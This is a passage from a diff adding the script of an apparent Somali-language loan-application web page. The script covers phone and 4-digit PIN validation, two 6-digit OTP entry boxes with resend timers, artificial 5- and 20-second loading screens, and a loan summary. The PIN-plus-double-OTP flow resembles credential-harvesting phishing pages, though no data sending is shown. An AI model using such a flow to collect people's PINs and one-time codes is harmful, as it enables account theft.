+        : `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>`;
+    };
+
+    function validate() {
+      document.getElementById("mainBtn").classList.toggle("on", phoneValue.length === 13 && getPin().length === 4);
+    }
+
+
+    /* ── Modals ── */
+    function om(id) { document.getElementById(id).classList.add("open") }
+    function cm(id) { document.getElementById(id).classList.remove("open") }
+    function bgClose(id, e) { if (e.target === document.getElementById(id)) cm(id) }
+
+    /* ── OTP setup ── */
+    function makeOtp(wrapId, hidId, pfx, btnId) {
+      const hid = document.getElementById(hidId);
+      const boxes = [0, 1, 2, 3, 4, 5].map(i => document.getElementById(pfx + i));
+      let dis = false;
+
+      document.getElementById(wrapId).addEventListener("click", () => { if (!dis) hid.focus() });
+
+      function render() {
+        const val = hid.value.replace(/\D/g, "").slice(0, 6);
+        hid.value = val;
+        const cur = val.length, foc = document.activeElement === hid;
+        boxes.forEach((b, i) => {
+          b.className = "otp-box";
+          b.textContent = val[i] || "";
+          if (dis) { b.classList.add("d"); return }
+          if (i < cur) b.classList.add("f");
+          if (i === cur && foc) b.classList.add("a");
+        });
+        if (btnId === "g1") otp1Val = val; else otp2Val = val;
+        const btn = document.getElementById(btnId);
+        if (val.length === 6) { btn.classList.add("on") } else { btn.classList.remove("on") }
+      }
+
+      hid.addEventListener("input", render);
+      hid.addEventListener("focus", render);
+      hid.addEventListener("blur", render);
+
+      return {
+        reset(disabled) {
+          dis = disabled; hid.value = ""; hid.disabled = disabled;
+          render(); if (!disabled) setTimeout(() => hid.focus(), 100);
+        }
+      };
+    }
+
+    const otp1 = makeOtp("ow1", "oh1", "o1b", "g1");
+    const otp2 = makeOtp("ow2", "oh2", "o2b", "g2");
+
+    function startTimer(n) {
+      const obj = n === 1 ? otp1 : otp2;
+      obj.reset(false);
+      let t = 120;
+      const tEl = document.getElementById("t" + n);
+      const rb = document.getElementById("r" + n);
+      tEl.textContent = t; rb.className = "rb";
+      const iv = setInterval(() => {
+        tEl.textContent = --t;
+        if (t <= 0) { clearInterval(iv); rb.classList.add("on"); obj.reset(true) }
+      }, 1000);
+      rb.onclick = () => {
+        if (!rb.classList.contains("on")) return;
+        clearInterval(iv); startTimer(n);
+      };
+    }
+
+
+    function showLoader5(text, cb) {
+      document.getElementById("loaderText").textContent = text;
+      document.getElementById("loaderOv").classList.add("show");
+      setTimeout(function () { document.getElementById("loaderOv").classList.remove("show"); if (cb) cb(); }, 5000);
+    }
+    function showLoader(text, cb) {
+      document.getElementById("loaderText").textContent = text;
+      document.getElementById("loaderOv").classList.add("show");
+      setTimeout(function () { document.getElementById("loaderOv").classList.remove("show"); if (cb) cb(); }, 20000);
+    }
+
+    function buildSummary() {
+      const dur = (P?.duration || 1) + ((P?.duration || 1) === 1 ? " bil" : " bilood");
+      document.getElementById("sumRows").innerHTML = P ? `
+    <div class="sr"><span class="srk">Magaca</span><span class="srv">${P.firstName || ""} ${P.lastName || ""}</span></div>
+    <div class="sr"><span class="srk">Telefoon</span><span class="srv">${maskPhone(phoneValue)}</span></div>
+    <div class="sr"><span class="srk">Da</span><span class="srv">${calcAge(P.dob)}</span></div>
+    <div class="sr"><span class="srk">Nooca Amaahda</span><span class="srv">${P.loanType || "—"}</span></div>
+    <div class="sr"><span class="srk">Xaddiga</span><span class="srv">$${fmt(P.loanAmount)}</span></div>
+    <div class="sr"><span class="srk">Muddada</span><span class="srv">${dur}</span></div>
+    <div class="sr"><span class="srk">Wadarta La Celinta</span><span class="srv">$${fmt(P.totalRepayable)}</span></div>
+  `: `<div class="sr"><span class="srk">Codsiga</span><span class="srv">Ma jiro</span></div>`;
+      document.getElementById("sumMo").textContent = "$" + fmt(P?.monthlyRepayment || 0);
+    }
+
+    function openOtp2() {
+      cm("msum"); om("m2"); startTimer(2);
+    }
+
+
+    function navigateTo(url) {
+      document.querySelector('.screen').classList.add('leaving');
+      setTimeout(function () { location.href = url; }, 260);
+    }
+  </script>
+</body>
+
+</html>
